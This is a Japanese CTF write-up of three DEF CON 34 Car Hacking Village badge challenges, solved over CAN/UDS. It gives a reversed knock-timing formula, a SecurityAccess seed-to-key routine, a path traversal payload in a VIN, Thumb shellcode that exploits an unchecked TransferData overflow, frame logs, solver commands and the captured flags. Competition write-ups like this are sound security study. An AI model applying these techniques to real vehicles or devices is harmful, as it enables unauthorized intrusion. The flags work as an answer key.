# DEF CON 34 CHV Badge CTF Writeup

> 本文は終了済みCTFを、公開・練習用バッジではなく、会場で公式から貸与された実際のCTF専用バッジ実機を使い、許可された競技環境で攻略した際の記録です。収録したソルバーを使い、3問すべてのflag取得を確認しています。AIエージェントツールを解析・コード・文書作成の補助に使用し、人間が確認して実機で3問を解きました。ただし、限定された1個体での検証であり、説明が100%完全または正確である保証はありません。FW、抽出物、主催者配布物は収録していません。

## 概要

CTF専用バッジへUSB接続し、内蔵USB CDC/SLCAN (`/dev/ttyACM1`) 経由だけで3問を攻略した。外付けUSB2CAN、物理UART、MicroPython REPLは使用していない。

CTFバッジの起動ログは次の構成を示した。

```text
[*] MCP2518: Using CHV_BADGE_V2
[*] MirrorInterface: SLCAN Bridge Active.
The real challenge is here. No help this time!
```

CTF版`main.py`はCore 0でstdinを破棄し、REPLへ戻らない。プレイヤーの攻撃面はUSB/SLCAN上のCANサービスである。

## The Speakeasy Door

### 通信プロトコル

- token要求：拡張ID `0x0005EED`、data `00`
- token応答：拡張ID `0x0005EEE`、4 byte little-endian token
- ノック：拡張ID `0x0ACCE55`、data `01`, `02`, `03`
- feedback：拡張ID `0x0005EF0`
- flag：標準ID `0x7ff`

feedback codeは`00=accepted`, `01=too early`, `02=too late`, `ff=expired`である。

### token変換の復元

Cshimの限定的なコード実行を読み取りprimitiveとして使い、CTF LittleFSの各4 KiB block先頭を走査した。`LessonKnock.mpy`をXIP `0x1013d000`で発見し、MPY v6として逆アセンブルした。

tokenの下位3 byteを`b1`, `b2`, `b3`、8 bitのnibble交換を次のように定義する。

```python
def swap(x):
    return ((x & 0x0f) << 4) | ((x & 0xf0) >> 4)
```

正解時間は以下だった。

```python
t1 = 100 + 4 * swap(b1)
t2 = 150 + 3 * (b2 ^ swap(b3))
t3 =  80 + 2 * swap(b1 ^ b2)
```

許容誤差は順に`±75`, `±50`, `±20` ms。USBスケジューリングの揺らぎを吸収するため、ソルバは既定で10 ms前倒しする。

### 実証ログ

```text
TX 00005EED [ 1] 00
RX 00005EEE [ 4] D8 24 0B B5
token=d8240bb5 timings_ms=(664, 594, 494)
TX 00ACCE55 [ 1] 01
RX 00005EF0 [ 1] 00
TX 00ACCE55 [ 1] 02
RX 00005EF0 [ 1] 00
TX 00ACCE55 [ 1] 03
RX 000007FF [...] 66 6C 61 67 7B ... 7D
```

実行コマンド：

```bash
python solve_knock_ctf.py /dev/ttyACM1 --backend chv
```

flag：

```text
flag{know_not_the_knocker_but_the_knocked}
```


## DTC Shuffle

### SecurityAccess鍵式

要求IDは`0x7e0`、応答IDは`0x7e8`。CTF `LessonDTC.mpy`はCTZ block `0x10132000`と`0x1013b000`から復元した。

16 bit seedを上位/下位byteに分け、8 bit rotate-rightを使う。

```python
lo = seed & 0xff
hi = (seed >> 8) & 0xff
key_lo = ror8(lo, 3) ^ hi
key_hi = ror8(hi, 5) ^ lo
key = (key_hi << 8) | key_lo
```

実測例：

```text
TX 7E0  27 01
RX 7E8  67 01 A1 57
seed=0xa157 key=0x5a4b
TX 7E0  27 02 5A 4B
RX 7E8  67 02
```

### VINによるpath traversal

VINが`CST`で始まる場合、残りの文字列がbrand名としてそのまま返る。DTC lookupは次のパスを構築する。

```text
/dtc/{brand}_dtc.bin
```

CTF flag databaseはrootの`/flag_dtc.bin`にある。そこでVINを次の値にする。

```text
CST../flag
```

brandは`../flag`となり、lookup先は次のように正規化される。

```text
/dtc/../flag_dtc.bin
→ /flag_dtc.bin
```

### 実証ログ

```text
TX 7E0 [13] 2E F1 90 43 53 54 2E 2E 2F 66 6C 61 67
RX 7E8 [ 3] 6E F1 90
TX 7E0 [ 8] 19 06 13 37 FF 00 00 00
RX 7E8 [...] 00 29 59 06 13 37 FF 5B 2E 2E 2F 46 4C 41 47 5D ...
```

長い応答はCAN-FD ISO-TP extended single-frame形式`00 <length> <UDS payload>`だった。descriptionは以下。

```text
[../FLAG] flag{d1agn0st1c_tr4v3rs4l}
```

実行コマンド：

```bash
python solve_dtc_ctf.py /dev/ttyACM1 --backend chv
```

flag：

```text
flag{d1agn0st1c_tr4v3rs4l}
```


## CAN Cshim

### fingerprint

要求IDは`0x666`、応答IDは`0x66e`。

```text
23 14 <address-be32> <length>  ReadMemory
34 00 00                       RequestDownload
36 <sequence> <payload>        TransferData
31 01 00 00                    RoutineControl
22 f1 90                       hidden DID
```

`34`応答からsession objectは公開版と同じ`0x20003054`だった。

```text
TX 666 34 00 00
RX 66E 74 20 54 30 00 20
```

dataはobject+8 (`0x2000305c`)。`0x36`は累積長の上限を検査せず、data offset 130がroutine marker、offset 132がcallback pointerである。

markerだけを`aa`にした132 byte版はRoutineControlに成功したが、gate `0x20003ecf`は`00`のままで、`22 f1 90`は`7f 22 33`となった。したがってcallback pointerの制御が必要だった。

### 最小payload

data先頭へ次の12 byte Thumbコードを置いた。

```asm
movs r0, #1
ldr  r1, [pc, #4]
strb r0, [r1]
bx   lr
.word 0x20003ecf
```

machine code：

```text
01 20 01 49 08 70 70 47 CF 3E 00 20
```

callback pointerをThumbアドレス`0x2000305d`へ変更し、markerは`aa`にする。総TransferData長は136 byte。flashやfilesystemは変更しない。

実行後の確認：

```text
TX 666 31 01 00 00
RX 66E 71 01 00 00
TX 666 23 14 20 00 3E CF 01
RX 66E 63 01
TX 666 22 F1 90
RX 66E 62 F1 90 66 6C 61 67 7B ... 7D
```

実行コマンド：

```bash
python solve_cshim_ctf.py /dev/ttyACM1 --backend chv --exploit
```

flag：

```text
flag{5h0uld_y0u_sh1m_a_5h1mmy}
```

## 追加調査：CTF filesystemの取得

Cshimのcallback primitiveを、XIP flashから60 byteをsession内scratchへコピーする読み取り専用routineへ変換した。LittleFSの352 blockを4 KiB strideで走査し、CTFファイルの物理位置を特定した。

- `LessonDTC.mpy`: CTZ `0x10132000` → `0x1013b000`
- `LessonKnock.mpy`: `0x1013d000`
- `main.py`: CTZ `0x101b9000` → `0x101ba000`
- root metadata: `0x100a0000/0x100a1000`

FWダンプ、抽出ファイル、逆アセンブル、およびraw通信ログは本公開リポジトリには含めていない。

## Flag一覧

| Challenge | Flag |
|---|---|
| The Speakeasy Door | `flag{know_not_the_knocker_but_the_knocked}` |
| DTC Shuffle | `flag{d1agn0st1c_tr4v3rs4l}` |
| CAN Cshim | `flag{5h0uld_y0u_sh1m_a_5h1mmy}` |
